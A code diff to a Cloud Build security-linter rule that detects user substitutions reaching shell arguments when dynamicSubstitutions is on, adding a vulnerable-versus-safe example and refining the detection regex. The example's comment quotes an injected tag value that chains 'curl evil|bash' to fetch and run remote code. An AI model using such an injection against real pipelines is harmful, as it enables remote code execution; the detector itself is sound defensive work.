@@ -26,7 +26,7 @@ from typing import Any
 
 from ...base import Finding, Severity
 from ...rule import Rule
-from ..base import iter_steps, step_name, step_strings
+from ..base import iter_steps, step_name
 
 RULE = Rule(
     id="GCB-004",
@@ -64,11 +64,43 @@ RULE = Rule(
         "``--ignore-file`` after verifying the user sub never "
         "feeds bash re-evaluation.",
     ),
+    exploit_example=(
+        "# Vulnerable: ``dynamicSubstitutions: true`` expands\n"
+        "# ``${USER_INPUT}`` at args-evaluation time. A trigger\n"
+        "# substitution carrying ``v1.0\";curl evil|bash;\"`` lands\n"
+        "# the metacharacters in the args array — the step's shell\n"
+        "# parses them as separate commands.\n"
+        "substitutions:\n"
+        "  _TAG: v1.0\n"
+        "options:\n"
+        "  dynamicSubstitutions: true\n"
+        "steps:\n"
+        "  - name: gcr.io/cloud-builders/docker@sha256:abc123...\n"
+        "    args: [build, -t, \"image:${_TAG}\", .]\n"
+        "\n"
+        "# Safe: either disable dynamicSubstitutions (use literal\n"
+        "# substitutions instead) or pass the substitution through\n"
+        "# an env var and let the shell handle quoting. The\n"
+        "# substitution becomes a single string argument the\n"
+        "# attacker can't escape from.\n"
+        "substitutions:\n"
+        "  _TAG: v1.0\n"
+        "steps:\n"
+        "  - name: gcr.io/cloud-builders/docker@sha256:abc123...\n"
+        "    entrypoint: bash\n"
+        "    env: ['TAG=${_TAG}']\n"
+        "    args:\n"
+        "      - -c\n"
+        "      - docker build -t \"image:$TAG\" ."
+    ),
 )
 
 # ``$_FOO`` or ``${_FOO}``, the leading underscore distinguishes user
-# substitutions from Cloud Build built-ins (``$PROJECT_ID``, etc.).
-_USER_SUB_RE = re.compile(r"\$\{?_[A-Z][A-Z0-9_]*\}?")
+# substitutions from Cloud Build built-ins (``$PROJECT_ID``, etc.). The
+# name may start with a digit (``_1``). A ``$$`` is Cloud Build's escape
+# for a literal ``$``, so ``$$_TAG`` isn't a substitution — the negative
+# look-behind keeps it from matching.
+_USER_SUB_RE = re.compile(r"(?<!\$)\$\{?_[A-Z0-9][A-Z0-9_]*\}?")
 
 
 def _dynamic_subs_enabled(doc: dict[str, Any]) -> bool:
@@ -78,10 +110,32 @@ def _dynamic_subs_enabled(doc: dict[str, Any]) -> bool:
     return options.get("dynamicSubstitutions") is True
 
 
+def _args_entrypoint_strings(step: dict[str, Any]) -> list[str]:
+    """Return only the ``args`` and ``entrypoint`` strings from a step.
+
+    GCB-004 deliberately excludes ``env`` and ``secretEnv``: the rule's
+    recommended remediation is to pass ``$_USER_SUB`` through ``env:``
+    so the shell handles quoting inside the script.  Scanning ``env``
+    would cause that safe pattern to still fire.
+    """
+    out: list[str] = []
+    ent = step.get("entrypoint")
+    if isinstance(ent, str):
+        out.append(ent)
+    args = step.get("args")
+    if isinstance(args, list):
+        for a in args:
+            if isinstance(a, str):
+                out.append(a)
+    elif isinstance(args, str):
+        out.append(args)
+    return out
+
+
 def _steps_using_user_subs(doc: dict[str, Any]) -> list[str]:
     offenders: list[str] = []
     for idx, step in iter_steps(doc):
-        for blob in step_strings(step):
+        for blob in _args_entrypoint_strings(step):
             m = _USER_SUB_RE.search(blob)
             if m:
                 offenders.append(f"{step_name(step, idx)}: {m.group(0)}")
